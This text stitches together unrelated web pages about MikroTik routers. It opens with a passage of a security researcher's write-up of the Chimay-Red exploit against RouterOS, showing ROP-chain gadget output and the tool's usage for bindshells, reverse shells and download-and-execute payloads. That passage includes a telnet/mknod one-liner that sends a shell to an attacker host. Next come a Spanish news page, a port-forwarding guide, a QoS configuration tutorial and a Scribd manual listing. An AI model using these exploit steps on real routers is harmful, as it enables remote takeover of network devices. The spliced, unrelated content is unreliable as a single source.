dlsym() in the binary PLT entry table is then called with the target symbol being the original writeable_segment_addr which should be pointing to >
"system\0"
The result of the call to dlsym() now should be a pointer to the system() function. This pointer is returned in EAX and jumped to with a jmp eax gadget with its argument register (EBP) set to (writeable_segment_addr + len("system\x00") + addr_size) which should be pointing to > "ls -la\0"
Produced gadgets:
Writing "system\0":
0x0000:
strncpy strncpy(134594588, 134512899, 1)
0x0004:
0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
0x0008:
0x805c01c arg0
0x000c:
0x8048103 arg1
0x0010:
0x1 arg2
<snip>
Writing "ls -la\0":
0x008c:
strncpy strncpy(134594604, 134512885, 1)
0x0090:
0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
0x0094:
0x805c02c arg0
0x0098:
0x80480f5 arg1
0x009c:
0x1 arg2
<snip>
Calling dlsym() & jmp_eax():
0x0118:
dlsym dlsym(0, 134594588)
0x011c:
0x804ffd9 <adjust: pop ebx; pop ebp; ret>
0x0120:
0x0 arg0
0x0124:
0x805c01c arg1
0x0128:
jmp_eax jmp_eax(134594604)
0x012c:
b'zaad' <pad>
0x0130:
0x805c02c arg0
Result:
system("ls -la")
Once the ROP chain has been built and packed for the given endianess, it can be sent during the payload stage as seen in the earlier procedure when abusing alloca(). Each gadget in the chain should be executed thanks to our return address overwrite earlier.
MikroDB
MikroDB is a sister application to Chimay-Red that allows easier portability and extendability of the exploit toolkit. its what allows hundreds of different types of ROP chains to be built without having access to the target binary itself; and it does this through a process like so:
Enumerates all stable vulnerable RouterOS 6.x versions available for download from MK's archive for all architectures by bruteforcing version numbers via HEAD requests.
Downloads all enumerated firmware images into a storage directory.
Catalogs the filename and SHA256 hash of the firmware file into a local SQLite database file.
Decompresses and extracts the webserver binary www from the SquashFS filesystem stored within NPK firmware image.
Stores and catalogs the filename and SHA256 hash of the www webserver binary into the SQLite database file.
For each webserver binary extracted, the file is ran through a ROP chain building process and information for building selected ROP-chain repeatably is stored in the SQLite database file.
Once MikroDB is finished its process, it can be portably used with Chimay-Red to build ROP-chains on the fly thanks to the stored offsets in the database, instead of downloading and extracting and storing 5GB+ of FW images in-order to facilitate attacking any version and architecture. This 500KB database can be built once in only a couple hours and kept forever. For your convenience, a prebuilt database is included in the source code repository for this project!
MikroDB was able to enumerate 352 vulnerable versions (as of writing this, it fluctuates oddly..) across all of their supported architectures, a table is represented below showing vulnerable versions available per architecture:
Architecture
# Vulnerable versions
x86
56
ARM
45
POWERPC
57
SMIPS
56
MMIPS
25
MIPSBE
57
TILE
56
MikroDB in action against x86: (skip through)
Wrapping it all together
Usage:
usage: chimay_red.py [-h] -t TARGET [-s] [-d] [--architecture ARCHITECTURE]
[--gdbport GDBPORT] [--binary BINARY]
[--shellcode SHELLCODE] [--vector VECTOR]
[--leakrounds LEAKROUNDS] [-v] [--version]
command
positional arguments:
command
command function to run on target, see below for
options
optional arguments:
-h, --help
show this help message and exit
-t TARGET, --target TARGET
target address:port
-l LHOST, --lhost LHOST
local address to bind to for listening for connectback commands
-s, --shell
return interactive shell as main payload (default)
-d, --debug
enable debugging mode
--architecture ARCHITECTURE
target architecture (will detect automatically if
target in route table range)
--gdbport GDBPORT
port to use when connecting to remote gdbserver
--binary BINARY
target binary (www)
--shellcode SHELLCODE
custom (optional) shellcode payload binary filepath
--vector VECTOR
optional vector type, see below for options
--leakrounds LEAKROUNDS
amount of rounds to leak pointers, higher is better,
but takes more time
-v, --verbose
Verbosity mode
--version
show program's version number and exit
commands:
COMMAND
FUNCTION
bindshell
create a bindshell
connectback
create a reverse shell
download_and_exe
connect back and download a file to then execute
ssl_download_and_exe
connect back and download a file via SSL to then execute
write_devel
write "devel-login" file to allow developer account login
write_devel_read_userfile
in addition to enabling developer logins, read back the users file
custom_shellcode
run arbitrary shellcode from `--shellcode` binfile
custom_shell_command
run a arbitrary $sh one liner on the target
vectors:
default: (mikrodb)
[Generic]
mikrodb:
use the accompanying mikrodb database to load offsets
based off of detected remote version to build a ROP chain.
build:
build a ROP chain from scratch given the www binary matching
the remote version running.
[Experimental]
brute: bruteforce uclibc base offset.
leak:
leak pointers from shared libraries to give better odds of
finding base offset of uclibc.
examples:
./chimay_red.py connectback --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=mikrodb
./chimay_red.py connectback -d --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=build
--binary $PWD/www --gdbport 4444
==================================================
|
_______
_
___
__|
| / ___/ /
(_)_ _
___ ___ ______/ _ \___ ___/ /|
|/ /__/ _ \/ /
' \/ _ `/ // /___/ , _/ -_) _
/ |
|\___/_//_/_/_/_/_/\_,_/\_, /
/_/|_|\__/\_,_/
|
|
/___/
|
==================================================
Additional tips & tricks
Getting a reverse shell without existing telnet access for devel-login
mknod /tmp/pipe p;telnet <attacker_ip> <attacker_port></tmp/pipe|bash>/tmp/pipe
This command creates a READ|WRITE fifo-file pipe in memory using mknod and redirects the standard-in and out of bash to the pipe and out through telnet.
Sending text to the LCD
"echo hello world > /dev/lcd"
image courtesy of BigNerd - Chimay-Red Github
See it live!
Chimay-Red in action:
Chimay-Red in debug mode:
Conclusions & Future Work
So did I accomplish my goals in the end? Well almost.
In the end I was able to exploit every stable release version for all architectures except TILE and ARM. Now you are probably wondering, "what the hell is TILE". It is for that specific reason why I was unable to support TILE. As for ARM, I have not had enough time to go through and test the ROP builder for ARM as of yet, but I hope to fully support the architecture soon.
I was also unable to complete the command for custom_shellcode as I am not able to get a mprotect ROP-chain working for all architectures and versions.
As for "Containerize and optionally emulate any system firmware for fuzzing and testing", I will be going over how to containerize and mass deploy swarms of RouterOS systems via Docker and libvirt in a later post so stay tuned :).
Ideas that didn't work:
I attempted to leak pointers from the heap by using a content-length of zero and sending small amounts of data into istream::read(). This resulted in some valid addresses being leaked from various areas of the process memory, although I was unable to use it in any way to predict ASLR offsets because of a lack of predictability in the leaked addresses. If the leaked addresses were in fact predictable in terms of their location in the process memory in correlation to the other threads and library load order on some systems it could possibly allow ROP chains to be crafted on the fly without the need of the target source webserver binary version.
Chimay-Blue?
Recently MK has fallen victim to an 0day against its Samba service within RouterOS: CVE-2018-7445, allowing for remote code execution. I hope to continue to build upon my existing Chimay-Red framework to integrate it. This should allow me to expand the 6.x exploit set past 6.38.5 and up to 6.41.2.
Famous MK Forum Quotes:
"Also, it seems that this exploit may not be functional in RouterOS version above v6.30.1"
https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
"After a thorough code review, we could not find anything hinting to the described issues."
https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
In the end, a span of approximately four years elapsed since the vulnerability was introduced until the time it was fixed. Four years should be enough for multiple competent code reviews to catch a blatant integer overflow in a critical function like reading user POST data. The fact this small issue was not discovered and fixed for so long, leads myself and I'm sure others to believe MK doesn't do code reviews or does not complete them often. If you are reading this MK, maybe stop custom writing and maintaining your: Webserver, Samba Server, RADIUS server, SSH server, TELNET server, FTP server, etc. Clearly you can't.
References
https://wikileaks.org/ciav7p1/cms/page_16384604.html
https://wikileaks.org/ciav7p1/cms/page_16384512.html
https://securelist.com/apt-slingshot/84312/
Software Used
Analysis:
- IDA Pro
- Binary Ninja
- BinNavi
Exploit:
- pwntools
- GDB
- GDB PEDA
- GEF
- Binutils Collection
Download
Chimay-Red and MikroDB are freely available for download on GitHub:
https://github.com/seekintoo/chimay-red
About the Author
Dayton Pidhirney is a Cybersecurity Researcher at Seekintoo. Dayton is an EE geek and is also Co-Founder of FirePick Services LLC., a maker-grade pick and place machine. Dayton's desk always has wires, screws, components and tools on it. Always. Seriously Dayton, clean your desk...
Comments, concerns, and corrections are welcome and not triaged by any marketing machine we are aware of: dpidhirney (at) seekintoo (dot) com
Categories
arcsight
careers
ctf
research
Social
twitter
linkedin
github
© 2018 Seekintoo Ltd. and/or its affiliates.
All rights reserved. Privacy PolicyMKE Solutions - Soluciones a medida, realizadas por expertos
Show Navigation Hide NavigationInicioMKE SolutionsISO 9001 – Política de CalidadPrensa & ComunicaciónCasos de ExitosSolucionesFastNetMon: Protección contra ataques DDoSFirewall Seguridad / VPNAncho de Banda & QoSCiclopeV6Oráculo: Monitoreo de RedesOctopus: Balanceador de WanesCentrales PBX IPVideoVigilancia IPEnlaces Inalámbricos y MESHSoporte ITOutSourcing MensualLicencias MikroTik RouterOSEntrenamientos Calendario Entrenamientos Recibir Próximas Fechas★ Consultores Certificados Academia EntrenamientosArticulosNoticiasContacto★ PartnersAdministracion BoletinRecursos Humanos
Oráculo: Un nuevo concepto en monitoreo de redes.Oráculo es una herramienta de monitoreo que permite tener un ojo en vuestra red.Constantemente está monitoreando los dispositivos (soporta varias marcas) y ante algún cambio en el estado de los mismos, genera alertas de notificaciones.Conozca más sobre Oráculo Buscar en MKE Solutions
Novedades en MikroTik RouterOS v6.45beta
Maximiliano Dobladez 30 mayo, 2019 Noticias Permalink
Importantes agregados tendrá el nuevo release del RouterOS v6.45, que en este momento se encuentra en fase beta, pero que en un par de semanas mas, tendrá su publicación final. En relación a la seguridad vemos un cambio importante en cómo manejará el almacenamiento de las contraseñas. Según el anuncio …
MikroTik RouterOS v6.43.16 [long-term] publicado Esta disponible para descargar la versión v6.43.16 del RouterOS en su rama long-term. El cambio único que tiene la lista es un …
MikroTik RouterOS v6.43.15 publicado Se ha publicado la versión v6.34.15 del RouterOS de la rama long-term. La lista de cambios trata principalmente mejoras, entre las principales …
MikroTik RouterOS v6.44.3 [stable] publicado Se ha publicado el release v6.44.3 de la rama stable del RouterOS con la siguiente lista de cambios (principalmente arreglos). What’s new …
Importantes actualizaciones de RouterOS en todas las ramas, con arreglos en IPv6 Desde hace un par de días se viene dando un intercambio entre los usuarios de MikroTik con la empresa, el problema: Cómo …
Actualización de RouterOS ante vulnerabilidades de IPv6 encontradas. Acaloradas discusiones se están dando en el foro de MikroTik en el hilo donde se esta hablando sobre las vulnerabilidades de IPv6 …
MikroTik RouterOS v6.44.1 [stable] publicado Está disponible para la descarga la versión v6.44.1 de la rama stable del RouterOS. La lista de cambios es la siguiente: What’s …
1 2 3 … 115 Página Siguiente →
Síguenos! Seguir a @mkesolutions Nuestros Canales
Integramos
MKE Solutions SA Paraná 416
5800 - Río Cuarto
Córdoba - Argentinainfo@mkesolutions.nethttp://www.mkesolutions.net
Teléfonos Argentina: +54 358 4210029 España: +34 924 469010
Bogotá, Colombia: +57 1 3819546 Lima, Perú: +51 1 7200198 DF, Mexico: +52 55 41708237
New York, EE.UU.: +1 914 352 1327
International Number iNum: +883 5100 0119 2883
Suscribase a nuestro Newsletter If you're human leave this blank:
Correo Electrónico
© 2008 - 2017 - MKE SolutionsPort Forwarding – MikroTik Support Malaysia
↓ Skip to Main Content
Home
User Manuals
First Time User
WinBox
UniFi
HyppTV
Maxis Home Fibre
DDNS
Port Forwarding
Home › Port Forwarding
Port Forwarding
Posted on October 8, 2012 by MikroTik
Posted in
—
2 Comments ↓
For example, you are hosting a web server with port number 80 in your private network and you would like to allow anyone on the Internet to access your web server, you can follow this guide to setup the port forwarding on your MikroTik router or RouterOS device.
You can change the port number and the IP address mentioned in this guide according to your requirement.
You have to know how to login to WinBox to follow this guide and your router should get connected to the Internet to allow the access from public network.
Run WinBox and connect to your router.
Click on “IP” on the menu then click “Firewall” on the sub-menu.
Click “NAT” on top to switch to it.
Press the plus button.
Change the values as below. “In. Interface” should be filled with the interface with Internet dial-up connection or public network, like UniFi, Maxis, TIME, Streamyx or other.
Switch to “Action”.
Change the values as below. “To Addresses” should be filled with the private IP address of your web server. “To Ports” should be filled with the port number of your web server.
Press “OK” to complete.
Now your web server is accessible from the Internet!
SummaryArticle NamePort ForwardingDescriptionFor example, you are hosting a web server with port number 80 in your private network and you would like to allow anyone on the Internet to access your web server, you can follow this guide to setup the port forwarding on your MikroTik router or RouterOS device.Author
MikroTik Malaysia
Publisher Name
Cloud Store
Publisher Logo
2 comments on “Port Forwarding”
Azle TX Car Insurance says:
December 23, 2012 at 12:13 pm
Nice. My thanks for writing that. I will come to your site to find out more and tell my neighbors about it.
Reply
John Chukwuma says:
July 27, 2018 at 6:21 pm
Port Forwarding Tips,
The Port Forwarding instruction are very clear and ok to understand thank you for this good work. more grace.
Reply
1 Pings/Trackbacks for "Port Forwarding"
Japan Guide says:
December 18, 2012 at 9:41 pm
I’m fantastic impressed with your writing skills and also with the egonomics layout on your blog :-). Is this a paid theme or…
Leave a Reply Cancel reply
Your email address will not be published. Required fields are marked *Comment Name *
E-mail *
Website
Save my name, email, and website in this browser for the next time I comment.
Search for:
Recent CommentsAzreim Amy on Setup for UniFi HyppTVlow ah lit on Setup for UniFi HyppTVJohn Chukwuma on Port ForwardingMikroTik on MikroTik User ManualsGuy Jazynka on MikroTik User Manuals
© 2019
MikroTik Support Malaysia
Responsive Theme
powered by
WordPress
TopReduce lag with a Mikrotik RouterBOARD | r1ch.netr1ch.netHomeBlogOld StuffForceBindIPGameBoostHDTwitchTestReduce lag with a Mikrotik hAP ACDo you play online games? Probably. Have you experienced lag? Very likely. Or perhaps you just want a really good home router? This page will guide you through setting up the Mikrotik hAP AC, a powerful "small business" router with dual band Wi-Fi.BackgroundNo matter how fast your internet connection is, if another program or person on your network competes for bandwidth, the packets are processed with the same priority, resulting in increased latency (or worse, packet loss) for your game or other interactive applications. Whether you share an internet connection with roommates or operate a gaming house, LAN center, etc, this can quickly become a problem.Many people are familiar with the trouble consumer grade routers can cause. It's not a surprise that the first troubleshooting technique is to reboot the device - consumer routers are designed to be low price and use cheap hardware with limited memory and poorly written software. From NAT table overflows to DHCP server crashes, your off-the-shelf router isn't that great. Many of them also have glaring security holes too which open your network to attack. While some routers offer QoS options to help prioritize traffic, they have very limited functionality and can even reduce performance since the hardware in such routers is not meant for any kind of serious processing.Thankfully there's a good step in between full grade business routers like Cisco (real Cisco, not Linksys) and the off-the-shelf consumer routers that you find at your local PC store. Mikrotik is a Latvian based company that produces both hardware (called RouterBOARD) and software (RouterOS) that provides a solid platform on which to build a router. The hardware alone is far better than almost anything you can find in consumer routers - dual or quad core CPUs, plenty of RAM, etc. The software package (RouterOS) provides a GUI to a Linux-based platform - Linux is well regarded for its performance and stability, and RouterOS builds on top of that. Don't worry, you don't need to know any complicated Linux stuff, RouterOS handles it all for you.This guide will focus on setting up and configuring the hAP AC. This is one of Mikrotik's newer router models targeted for home / small businesss use, with a 720 MHz CPU, high power triple chain 2.4 GHz 802.11n and 5 GHz 802.11ac wireless and five port gigabit Ethernet. The hAP AC can handle QoS up to around 250mbps internet connections.PurchasingAs a Mikrotik RouterBOARD is somewhat specialized hardware, you are unlikely to find many physical stores carrying them, so be prepared to order online. Depending on where you live, you have several options. In the US, the hAP AC is available at roc-noc.com, one of my preferred distributors (I've ordered many times from them with zero problems). It's also available on Amazon through various resellers.Outside of the US, I recommend consulting the Mikrotik distributor list to find a local seller.Unboxing And ConnectingYou'll receive a small box containing the router, a power adapter and possibly a sticker with your serial number on it. Don't expect any pretty manuals or setup CDs - remember these are not consumer routers! If you get a sticker, attach it to the bottom of your router for safe keeping. You don't need to worry about the serial number unless you have to do a complete re-imaging of the RouterOS software.Depending on your distributor, the default configurations for the device can vary, but usually it will work out of the box with no setup. The 1st Ethernet port will be setup for WAN (internet) use, and ports 2-5 are your LAN. That weird looking port is an SFP port for connecting fiber optic cables, you can safely ignore it!Connect your internet (cable modem, fiber, DSL, etc) to port 1 and a PC or laptop to port 2 on the router using an Ethernet cable, then plug in the power. The router should take around 15-30 seconds to boot. Now turn on your PC or laptop and it should hopefully acquire an IP address via DHCP from the router.Accessing The Configuration PageThe most common default IP address range is 192.168.88.0/24, so your device will likely have an IP of 192.168.88.254 or similar. You should now be able to navigate to http://192.168.88.1/ in your browser to access "Webfig" - this is the web based management tool that will configure your router.You may receive a message on the first login saying that a default configuration has been applied. If so, click "keep configuration", otherwise the router will reset to a completely empty state and require a much more complicated setup procedure!Depending on the version of the factory software, you may either be directly in the Webfig menu, or at the top of the screen there will be several tabs, "Quick Set", "Webfig" and "Terminal". We want to be using Webfig for the rest of this guide (like this screenshot).Side note: RouterOS runs on top of a full Linux OS. As such, you should avoid abruptly unpowering the router where possible as you run a small risk of causing file system corruption. There is a system / shutdown option which you can use to initiate a clean shutdown, at which point it is safe to remove power.Getting Up To DateAs the router has probably been sitting around in a warehouse for a few months, it's important to update the software to ensure you have the latest security and performance updates. To do this, on the left menu choose System / Packages and click "Check for updates". If an update is available, hit "Download and install" and your router will reboot and install the update.Wireless ConfigNow let's set up your wireless network. On the Wireless menu in Webfig, click on wlan1 to open up the properties for the 2.4 GHz wireless adapter. Press the "Advanced Mode" button at the top, then set the following options:Wireless Protocol: 802.11Frequency Mode: regulatory domainCountry: Your countryChannel Width: 20/40 MHz CeFrequency: Either 2412 / 2437 / 2462. You want to pick the least congested frequency - use the "Freq Usage" button as a quick testSSID: Name of your wireless networkWMM Support: EnabledWPS Mode: DisabledHit OK, then do the same things for wlan2 (the 5 GHz adapter). There are many more frequencies available in 5 GHz and some of them have special conditions for use. The "Auto" setting is probably a safe choice unless you know what you're doing. Be extra careful to make sure you've selected the correct country setting as some frequencies may be illegal to use otherwise!Hit OK again, then go to the "Security Profiles" tab of the Wireless dialog. Click "default" and set the following:Mode: Dynamic keysAuthentication Types: WPA2 PSKCiphers: aes ccmWPA 2 Pre Shared Key: Your wireless passwordGroup Key Update: 01:00:00This should leave you with a fully secured wireless network.System Passwords And Other SettingsGo to System / Password and enter a password to secure the router's admin interface. You'll need this password to enter the configuration again in the future.Go to IP / UPNP and tick Enabled. Click the Interfaces tab, then click Add New to add a new interface. Add ether1 (your internet) as an external interface. Hit OK, then Add New and add bridge-local as your internal interface. Enabling UPNP allows applications on your network to configure port forwarding automatically if needed.Go to IP / DNS and enter 8.8.8.8 as your DNS server. This is Google DNS, which is usually faster and more reliable than your ISP DNS.At this point you are pretty much set if all you want is a solid, stable router. The next steps will set up QoS to ensure smooth gaming and streaming.Quality of ServiceThis is where it starts to get a little complicated. Rather than explain everything involving the firewall, connection marking, packet tagging, queues, priorities, etc, I'm going to give you a bunch of commands that you should run. To run these commands, you'll need to download the "Winbox" app as it uses console commands that aren't available in the web interface. Press the "Winbox" button, which should download a copy of Winbox for you. Log in to the router using Winbox and you'll see it looks mostly the same as Webfig, but it's a bit more powerful.Press the "New Terminal" button in Winbox and paste in the following (you can press Shift+Ins to paste into the terminal):/queue treeadd limit-at=9700k max-limit=9700k name=queue1 parent=ether1-gateway queue=defaultadd limit-at=6200k max-limit=6200k name=prio5-streaming packet-mark=streaming parent=queue1 priority=5 queue=defaultadd limit-at=100k max-limit=9500k name=prio8-untagged packet-mark=no-mark parent=queue1 queue=defaultadd limit-at=1G max-limit=1G name=prio3-gaming packet-mark=gaming parent=queue1 priority=3 queue=defaultadd limit-at=1G max-limit=1G name=prio2-misc-fast packet-mark=misc-fast parent=queue1 priority=2 queue=defaultadd limit-at=100k max-limit=9500k name=prio6-http packet-mark=http parent=queue1 priority=6 queue=default/ip firewall mangle
add action=mark-packet chain=postrouting connection-mark=streaming new-packet-mark=streaming passthrough=no
add action=mark-packet chain=postrouting connection-mark=gaming new-packet-mark=gaming passthrough=no
add action=mark-packet chain=postrouting new-packet-mark=misc-fast packet-size=40 passthrough=no protocol=tcp tcp-flags=ack
add action=mark-packet chain=postrouting dst-port=53 new-packet-mark=misc-fast out-interface=ether1-gateway passthrough=no protocol=udp
add action=mark-packet chain=postrouting connection-mark=http new-packet-mark=http passthrough=no
add action=mark-connection chain=postrouting comment=Streaming connection-state=new dst-port=1935 new-connection-mark=streaming out-interface=ether1-gateway protocol=tcp
add action=mark-connection chain=postrouting comment=League dst-port=5000-5500 new-connection-mark=gaming out-interface=ether1-gateway protocol=udp
add action=mark-connection chain=postrouting comment=SC2 dst-port=1119 new-connection-mark=gaming out-interface=ether1-gateway protocol=udp
add action=mark-connection chain=postrouting comment=HotS dst-port=1120,3724 new-connection-mark=gaming out-interface=ether1-gateway protocol=udp
add action=mark-connection chain=postrouting comment="BW + HotS" dst-port=6112-6113 new-connection-mark=gaming out-interface=ether1-gateway protocol=udp
add action=mark-connection chain=postrouting comment="Valve Games" dst-port=27000-27060 new-connection-mark=gaming out-interface=ether1-gateway protocol=udp
add action=mark-connection chain=postrouting comment="Web Browsing" connection-state=new dst-port=80,443 new-connection-mark=http out-interface=ether1-gateway protocol=tcpAfter doing this, click on Queues / Queue Tree and double click queue1. You'll see the value 9700k - this should be replaced by a little under your upload speed, in kbps. The copy/paste code above is designed for someone with 10 mbps upload, so the maximum upload is limited to 9.7mbps (9700k). You want to limit it just under your max upload, otherwise there is a risk the upload will be queued on your modem instead, making all the QoS worthless. After setting your max upload on queue1, double click streaming and set it to a little over your maximum stream bitrate so that the stream bandwidth is smoothed out (the default above is for a 6000kbps stream). If you don't stream just ignore this - it won't hurt anything.Next, double click http and no-mark and do the same there - replace 9500k with a number slightly less than the number you used for queue1. This will ensure big HTTP downloads and generic uncategorized traffic won't be able to hog the connection.You're done! You now have a basic upload QoS, with supported games being StarCraft 2, Brood War, Valve Source based games (CS:GO, Dota 2, etc), Heroes of the Storm and League of Legends . Gaming and important small packets such as TCP acks and DNS get the highest priority, ensuring there's no lag even if the upstream is being heavily used. The next highest priority is outgoing stream data, so if you're streaming you won't get dropped frames caused by other uploads such as videos or torrents. If you want to add additional games, figure out what UDP ports the game uses and copy one of the existing "mark connection" rules like SC2, replacing the dst-port with the appropriate UDP ports.Twitter: @R1CH_TLPGP Key: 6063 0E77 824A 5F71 82E8
3239 AAC1 E526 5D71 B3FDRouterOS Official Documentation v4 2013 | Ip Address | I Pv6
SearchSearchClose suggestionsUploadenChange LanguageSign InJoinHomeSavedBestsellersBooksAudiobooksSnapshotsMagazinesDocumentsSheet MusicUploadEnglishRead Free For 30 DaysSign In2.3K views0Up votes, mark as useful0Down votes, mark as not usefulRouterOS Official Documentation v4 2013Uploaded by Defka22Full descriptionCopyright: Attribution Non-Commercial (BY-NC)Download as PDF, TXT or read online from ScribdFlag for inappropriate contentsaveSave RouterOS Official Documentation v4 2013 For LaterInfoInfoEmbedEmbedShareSharePrintPrintDownloadJump to Page You are on page 1of 1016Search inside document
PDF generated using the open source mwlib toolkit. See http://code.pediapress.com/ for more information.PDF generated at: Thu, 17 Oct 2013 19:25:55 UTC
RouterOS OfficialDocumentation v4
2013
Contents
Articles
Manual:TOC 1Manual:First time startup 4Manual:Initial Configuration 8Manual:Console login process 31Manual:Troubleshooting tools 36Manual:Support Output File 46Manual:RouterOS features 48Manual:RouterOS FAQ 51Manual:Connection oriented communication (TCP/IP) 57Manual:Console 63Manual:Winbox 71Manual:Webfig 87Manual:License 94Manual:Purchasing a License for RouterOS 100Manual:Entering a RouterOS License key 102Manual:Replacement Key 105Manual:Product Naming 106Manual:RouterOS6 news 109Manual:Default Configurations 112Manual:System/Packages 117Manual:Upgrading RouterOS 120Manual:CD Install 129Manual:Netinstall 134Manual:Configuration Management 142Manual:Interface 147Manual:Interface/Bonding 149Manual:Interface/Bridge 157Manual:Interface/EoIP 166Manual:Interface/Ethernet 169Manual:Interface/Gre 174Manual:Interface/Gre6 176Manual:Interface/HWMPplus 177Manual:Interface/IPIP 189Manual:Interface/L2TP 191
Manual:Interface/OVPN 197Manual:Interface/PPP 201Manual:Interface/PPPoE 202Manual:Interface/PPTP 213Manual:Interface/SSTP 219Manual:Interface/Traffic Engineering 229Manual:Interface/VLAN 232Manual:Interface/VPLS 238Manual:Interface/VRRP 241Manual:Interface/Virtual-ethernet 248Manual:Interface/Wireless 249Manual:Fast Path 279Manual:PoE-Out 281Manual:Switch Chip Features 288Manual:Spectral scan 295Manual:BCP bridging (PPP tunnel bridging) 300Manual:WMM 308Manual:Wireless Debug Logs 310Manual:Wireless FAQ 314Manual:MLPPP over single and multiple links 318Manual:Maximum Transmission Unit on RouterBoards 320Manual:Wireless AP Client 326Manual:Bonding Examples 331Manual:VRRP-examples 333Manual:Wireless card diagnostics 336Manual:Making a simple wireless AP 343Manual:Wireless Station Modes 347Manual:Nv2 350Manual:Wireless Advanced Channels 355Manual:IPv6/ND 357Manual:IPv6/Neighbors 362Manual:IPv6/Pool 363Manual:IPv6 Overview 364Manual:Simple Static IPv6 Routing 369Manual:My First IPv6 Network 371Manual:OSPFv3 with Quagga 375Manual:Creating IPv6 loopback address 378Manual:IPv6/Address 379
Share this documentShare or Embed DocumentSharing OptionsShare on Facebook, opens a new windowShare on Twitter, opens a new windowShare on LinkedIn, opens a new windowShare with Email, opens mail clientCopy TextRelated InterestsIp AddressI Pv6Router (Computing)Command Line InterfaceWireless LanRelated SearchesRouteros by exampleMikrotik routerosRouterosRoute manualFooter MenuBack To TopAboutAbout ScribdPressOur blogJoin our team!Contact UsJoin todayInvite FriendsGiftsSupportHelp / FAQAccessibilityPurchase helpAdChoicesPublishersLegalTermsPrivacyCopyrightSocial MediaCopyright © 2019
Scribd Inc.Browse BooksSite DirectorySite Language:EnglishChange LanguageEnglishChange Language
576648e32a3d8b82ca71961b7a986505